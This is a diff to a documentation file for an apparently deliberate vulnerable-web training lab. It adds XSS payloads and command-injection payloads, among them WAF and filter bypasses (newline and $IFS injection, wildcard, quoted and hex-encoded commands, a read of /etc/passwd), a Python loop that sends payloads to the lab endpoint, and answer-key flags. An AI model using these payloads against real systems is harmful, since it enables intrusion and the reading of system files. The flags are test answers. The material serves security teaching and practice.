@@ -253,42 +253,49 @@ GET /api/labs/sqli/account/1 UNION SELECT 1,key,value FROM admin_secrets
 ## Lab 2: Cross-Site Scripting (XSS) - TechBlog
 
 **URL:** `/labs/beginner/xss`
-**API Endpoints:**
-- `GET /api/labs/xss/comments` - Retrieve comments
-- `POST /api/labs/xss/comments` - Add new comment
-- `GET /api/labs/xss/search?q=` - Search articles
+**Vulnerable Pages (Real XSS Execution):**
+- `GET /vuln/xss/blog` - Vulnerable blog with comment form (Stored XSS)
+- `POST /vuln/xss/blog/comment` - Submit comment (vulnerable to stored XSS)
+- `GET /vuln/xss/search?q=` - Vulnerable search page (Reflected XSS)
+
+**Note:** This lab uses real vulnerable HTML pages that actually execute JavaScript. When you inject `<script>alert('XSS')</script>`, you will see a real popup!
 
 ### Stored XSS Attack
 
-1. Navigate to the blog comments section
-2. In Burp Suite, intercept the POST request when submitting a comment
-3. Inject JavaScript in the author or content field
+1. Navigate to the XSS lab and select "Stored XSS" tab
+2. The vulnerable blog page is embedded in an iframe
+3. Submit a comment with JavaScript code in the author or content field
+4. **JavaScript will actually execute** - you'll see an alert popup!
 
-**Payloads:**
+**Payloads (Real Execution):**
 ```html
 <script>alert('XSS')</script>
 <img src=x onerror="alert('XSS')">
 <svg onload="alert('XSS')">
+<body onload="alert('XSS')">
 ```
 
 ### Reflected XSS Attack
 
-1. Use the search functionality
-2. Inject JavaScript in the search query parameter
+1. Select the "Reflected XSS" tab
+2. Enter a payload in the search box or craft a URL directly
+3. The JavaScript will execute immediately
 
 **Payload:**
 ```
-/api/labs/xss/search?q=<script>alert('XSS')</script>
+/vuln/xss/search?q=<script>alert('XSS')</script>
+/vuln/xss/search?q=<img src=x onerror=alert(document.domain)>
 ```
 
 ### Flags
-- `FLAG{STORED_XSS_INJECTION}` - Stored XSS in comments
-- `FLAG{REFLECTED_XSS_SEARCH}` - Reflected XSS in search
+- `FLAG{STORED_XSS_REAL_EXECUTION}` - Stored XSS executed (found in page source)
+- `FLAG{REFLECTED_XSS_REAL_EXECUTION}` - Reflected XSS executed (found in page source)
 
 ### Prevention
 - Encode output (HTML entity encoding)
 - Use Content-Security-Policy headers
 - Validate and sanitize all input
+- Use frameworks that auto-escape output (React, Angular)
 
 ---
 
@@ -341,47 +348,118 @@ Signature: [base64 signature]
 ## Lab 4: Command Injection - Network Diagnostics
 
 **URL:** `/labs/beginner/cmdi`
-**API Endpoint:** `POST /api/labs/cmdi/ping`
-**Scenario:** Server administration tool with ping functionality
+**API Endpoints:**
+- `POST /api/labs/cmdi/ping` - Basic mode (no filtering)
+- `POST /api/labs/cmdi/ping-advanced` - Advanced mode (filter bypass challenge)
+- `POST /api/labs/cmdi/ping-expert` - Expert mode (WAF bypass challenge)
 
-### Exploitation Steps
+**Scenario:** Server administration tool with ping functionality - **REAL COMMAND EXECUTION**
+
+**Note:** This lab executes real commands on the server! When you inject commands like `; id`, you will see actual system output.
+
+---
+
+### Basic Mode (No Filtering)
 
 1. Navigate to the network diagnostics tool
-2. Enter a valid host to see normal behavior
+2. Select "Basic Mode" (green button)
 3. Inject commands using shell metacharacters
 
-**Payloads:**
+**Payloads (Real Execution):**
 ```
+127.0.0.1; id
 127.0.0.1; cat /etc/passwd
 127.0.0.1 | ls
 127.0.0.1 & whoami
-$(cat /etc/passwd)
-`id`
+$(id)
+`whoami`
 ```
+
+**Flag:** `FLAG{COMMAND_INJECTION_RCE}` - Remote code execution achieved
+
+---
+
+### Advanced Mode (Filter Bypass Challenge)
+
+Select "Advanced (Filter Bypass)" tab. This mode blocks common injection characters:
+- Blocked: `; | & $( \``
+
+**Challenge:** Bypass the filter to execute commands!
+
+**Bypass Techniques:**
+```bash
+# Newline injection
+127.0.0.1%0aid
+127.0.0.1
+id
+
+# $IFS (Internal Field Separator)
+127.0.0.1$IFS;id
+```
+
+**Flag:** `FLAG{CMDI_FILTER_BYPASS_NEWLINE}` - Filter bypass achieved
+
+---
+
+### Expert Mode (WAF Bypass Challenge)
+
+Select "Expert (WAF Bypass)" tab. This mode has aggressive WAF protection:
+- Blocked characters: `; | & $( \` \n %0a`
+- Blocked commands: `cat ls id whoami bash sh`
+- Blocked paths: `/etc /bin`
+
+**Challenge:** Bypass the WAF to execute commands!
+
+**Advanced Bypass Techniques:**
+```bash
+# Use wildcards and encoding
+127.0.0.1$IFS;/???/???ami
+127.0.0.1$IFS;w'h'o'a'm'i
+127.0.0.1$IFS;c\at /e\tc/p\asswd
+127.0.0.1$IFS;$(printf '\x69\x64')  # hex encoded 'id'
+```
+
+**Flag:** `FLAG{CMDI_WAF_BYPASS_EXPERT}` - WAF bypass achieved
+
+---
 
 ### Automated Exploitation (Python)
 ```python
 import requests
 
+# Basic mode
 url = "https://your-site/api/labs/cmdi/ping"
 payloads = [
-    "127.0.0.1; cat /etc/passwd",
+    "127.0.0.1; id",
     "127.0.0.1 | ls",
-    "127.0.0.1 & id"
+    "127.0.0.1 & whoami"
 ]
 
 for payload in payloads:
     r = requests.post(url, json={"host": payload})
     print(r.json())
+
+# Advanced mode - Filter bypass
+url_adv = "https://your-site/api/labs/cmdi/ping-advanced"
+r = requests.post(url_adv, json={"host": "127.0.0.1\nid"})
+print(r.json())
 ```
 
-### Flag
-- `FLAG{COMMAND_INJECTION_RCE}` - Remote code execution achieved
+### All Flags Summary
+| Mode | Flag |
+|------|------|
+| Basic | `FLAG{COMMAND_INJECTION_RCE}` |
+| Advanced (Filter Bypass) | `FLAG{CMDI_FILTER_BYPASS_NEWLINE}` |
+| Expert (WAF Bypass) | `FLAG{CMDI_WAF_BYPASS_EXPERT}` |
+
+**Total: 3 flags for Command Injection lab**
 
 ### Prevention
 - Never pass user input directly to system commands
 - Use allowlists for valid inputs
 - Implement command argument escaping
+- Use safe APIs (e.g., subprocess with shell=False)
+- Run commands with minimal privileges
 
 ---
 
